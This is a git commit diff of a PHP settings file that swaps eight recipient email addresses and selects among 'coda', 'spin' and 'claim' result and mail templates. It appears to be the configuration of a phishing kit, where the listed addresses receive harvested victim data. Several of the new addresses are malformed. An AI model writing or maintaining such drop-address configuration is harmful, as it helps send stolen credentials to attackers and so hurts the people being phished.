ae7bb32da44674edf8d8d60b496bdaa2e18486b0
Mallzx <abdilmaulana67@protonmail.com>
2024-12-16 17:54:29 +0800

    Up setting.php

--- setting.php
+++ setting.php
@@ -1,12 +1,12 @@
 <?php
-$email1 = 'stokrenznesia12@gmail.com';
-$email2 = 'stokrenznesia12@gmail.com';
-$email3 = 'stokrenznesia12@gmail.com';
-$email4 = 'stokrenznesia12@gmail.com';
-$email5 = 'stokrenznesia12@gmail.com';
-$email6 = 'stokrenznesia12@gmail.com';
-$email7 = 'stokrenznesia12@gmail.com';
-$email8 = 'stokrenznesia12@gmail.com';
+$email1 = 'delighted.dragonfly.ltpt@mask.me@gmail.com';
+$email2 = '@gmail.com';
+$email3 = '@gmail.com';
+$email4 = '@gmail.com';
+$email5 = '@gmail.com';
+$email6 = '@gmail.com';
+$email7 = '@gmail.com';
+$email8 = '@gmail.com';
 $jenisress = $coda; //$coda, $spin, $claim
 $jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
 ?>
